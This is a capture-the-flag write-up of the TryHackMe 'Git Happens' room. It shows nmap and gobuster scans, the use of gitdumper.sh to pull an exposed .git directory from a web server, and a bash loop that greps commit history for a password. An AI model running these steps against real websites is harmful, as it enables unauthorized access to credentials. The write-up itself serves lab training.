---
title: TryHackMe - Git Happens
description: My writeup on Git Happens box.
categories:
 - tryhackme
tags: tryhackme git gitdumper bash
---

![](https://i.imgur.com/pqrO7lX.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **Git Happens**  |
| Difficulty :  | **Easy/Medium**             |   
| Play :    | [Git Happens](https://tryhackme.com/room/githappens){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

Hello all, i got bored of vulnhub and i'll focus on tryhackme only. Let's start with this awesome challenge! It's all about git enumeration to find a password, let's start!

## Enumeration/Reconnaissance

Now as always let’s start with a nmap scan.

```
$ ip=10.10.18.139
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 15:51 EET
Warning: 10.10.18.139 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.18.139 (10.10.18.139)
Host is up (0.53s latency).
Not shown: 38165 filtered ports, 27369 closed ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 62.20 seconds

$ nmap -p 80 -sC -sV -oN nmap/githappens.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-26 15:53 EET
Nmap scan report for 10.10.18.139 (10.10.18.139)
Host is up (0.23s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git:
|   10.10.18.139:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
```

Only 1 service that's good, once we visit it we can see a login page:

![](https://i.imgur.com/PHXrxxW.png)

Tried some basic stuff like `admin:admin` etc but nothing seems to work, seems like a static page. Let's run a `gobuster` scan.

```
$ gobuster dir -q -u http://$ip/ -w $common -x php,txt,html -o scans/gobuster.txt
/.git/HEAD (Status: 200)
```

We have a `/.git` directory! That's great, i found an awesome [gitdumper tool](https://github.com/internetwache/GitTools/blob/master/Dumper/gitdumper.sh){:target="_blank"} to download .git repository from the webserver.

```
$ wget -q https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
$ bash gitdumper.sh http://$ip/.git/ scans/results
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances.
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating scans/results/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
...data...
```

## Getting The Flag

Perfect, now this reminds me of the DevOops box from hackthebox. We will use 2 commands:

```
git log = history of everything that happen to a repository.
git show = view details of the commit.
```

Running `git log` we can see lot of commits.

![](https://i.imgur.com/LI94paJ.png)

We will check every commit with the `git show` like this:

`$ git show 77aab78e2624ec9400f9ed3f43a6f0c942eeb82d`

![](https://i.imgur.com/aAPkwpa.png)

This will take lot of time, so i coded a bash script to do this job! :D

```bash
for commits in $(git log | grep commit | cut -d ' ' -f2 | head -9)
do
	git show $commits | grep password
done
```

We have the flag (Note: i'll hide the flag because i want to submit the writeup to tryhackme platform):

```
$ bash flag.sh
...data...
+          password === "TRY_TO_GET_IT_ALONE"
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
